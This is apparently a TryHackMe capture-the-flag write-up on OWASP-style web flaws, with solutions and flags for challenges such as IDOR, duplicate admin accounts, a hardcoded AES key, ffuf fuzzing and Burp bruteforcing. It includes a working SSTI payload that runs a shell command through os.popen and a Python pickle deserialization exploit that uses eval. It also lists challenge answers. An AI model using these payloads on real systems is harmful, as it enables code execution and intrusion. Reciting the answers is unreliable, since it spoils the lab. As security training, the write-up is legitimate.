IAAA Failures(1/3)
What is IAAA?
What does IAAA stand for?

Identity, Authentication, Authorisation, Accountability

A01: Broken Access Control
If you don't get access to more roles but can view the data of another users, what type of privilege escalation is this?

Answer: Horizontal

What is the note you found when viewing the user's account who had more than $ 1 million?

Flag: THM{Found.the.Millionare!}

Writeup:

The site is vulnerable to IDOR vulnerability by changing the id from 5 to 7 gives access to other's profile were the flag is hidden.


A07: Authentication Failures
What is the flag on the admin user's dashboard?
Writeup: Here we can create duplicate account using the same username admin in different cases eg. aDMIN

image
Now login with the same username which is Admin account authentication failure.

image
Flag: THM{Account.confusion.FTW!}

A09: Logging & Alerting Failures
It looks like an attacker tried to perform a brute-force attack, what is the IP of the attacker?
Answer: 203.0.113.45

Why?

image
We can see the timing between each request is very less which is in miliseconds, So we can confirm that this is an automated bruteforce trial.

Looks like they were able to gain access to an account! What is the username associated with that account?

Answer: admin

What action did the attacker try to do with the account? List the endpoint the accessed.

Answer: /supersecretadminstuff

Application Design Flaws(2/3)
AS02: Security Misconfigurations
Challenge Link(Instance): http://10.49.154.138:5002

image
Writeup:

Directory bruteforcing /api endpoints reveals few other directories. In /api/user/admin the flag can be retrieved.

image image
Flag: THM{V3RB0S3_3RR0R_L34K}

AS03: Software Supply Chain Failures
Here they have given one python file and the challenge link.

Challenge Link(Instance): http://10.49.154.138:5003

image
We have two endpoints to hit here, one is /api/health and /api/process.

/api/health - Doesn't seem interesting

Let’s hit /api/process. Make sure to include the Content-Type: application/json header, since it’s a RESTful API that works only with JSON. Also, it’s a POST request, so it requires a parameter which is data.

image
So we need to find the value for the data parameter, Lets anaylse the python code for any leaks.

image
if data == 'debug': # Value Leaked Here
            return jsonify(debug_info())
So our value is debug, which reveals the flag.

image
Flag: THM{SUPPLY_CH41N_VULN3R4B1L1TY}

AS04: Cryptographic Failures
Challenge Link: http://10.49.154.138:5004/

Were we can see a Encrypted text in the index page

image
Nzd42HZGgUIUlpILZRv0jeIXp1WtCErwR+j/w/lnKbmug31opX0BWy+pwK92rkhjwdf94mgHfLtF26X6B3pe2fhHXzIGnnvVruH7683KwvzZ6+QKybFWaedAEtknYkhe
Anaylsing the source code we can see a js file called decrypt.js which revealed the secret key and algorithm of the encryption

image
Algorithm: AES

Cipher Mode: ECB

Padding: No Padding

Key-Size: 128

Key: my-secret-key-16

Now lets decrypt it using decryptors in online like https://www.devglan.com/online-tools/aes-encryption-decryption

Which reveals the flag:

image
Flag: THM{CRYPTO_FAILURE_H4RDCOD3D_K3Y}

A05: Injection
Writeup:

Class SSTI Payload:

{{self.__init__.__globals__['__builtins__']['__import__']('os').popen('cat flag.txt').read()}}
image
Flag: THM{SSTI_FLAG_OBTAINED}

AS06: Insecure Design
Challenge Link: http://10.49.154.138:5005

Writeup:

image
Hitting /api/users/admin this endpoint reveals

image
We can see /api/users/admin gives some data lets try fuzzing the endpoint after /api/ with /admin maybe we can get endpoints like /api/profile/admin or /api/data/admin

Fuzzing with ffuf:

Command:

ffuf -u http://10.49.154.138:5005/api/FUZZ/admin -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
image
We get /messages endpoints which reveals the flag:

image
Flag: THM{1NS3CUR3_D35IGN_4SSUMPT10N}

Insecure Data Handling(3/3)
Writeup:

We got an challenge website where 3 letters of the xor key is revealed and we need to find the one letter of the key to decrypt the flag

image
So we can bruteforce which burp and find the key.

Setting up the burp intruder and selecting the last character of the key and select bruteforce mode in the intruder

image
Now filter the responses with Length we can see 1 has the highest length lets try KEY1 .

image
Flag: THM{WEAK_CRYPTO_FLAG}

Software or Data Integrity Failures
Writeup:

import pickle
import base64

class Malicious:
    def __reduce__(self):
        # Return a tuple: (callable, args)
        # This will execute: open('flag.txt').read()
        return (eval, ("open('flag.txt').read()",))

# Generate and encode the payload
payload = pickle.dumps(Malicious())
encoded = base64.b64encode(payload).decode()
print(encoded)
O/P:

gASVMwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwXb3BlbignZmxhZy50eHQnKS5yZWFkKCmUhZRSlC4=
image
Flag: THM{INSECURE_DESERIALIZATION}

image 
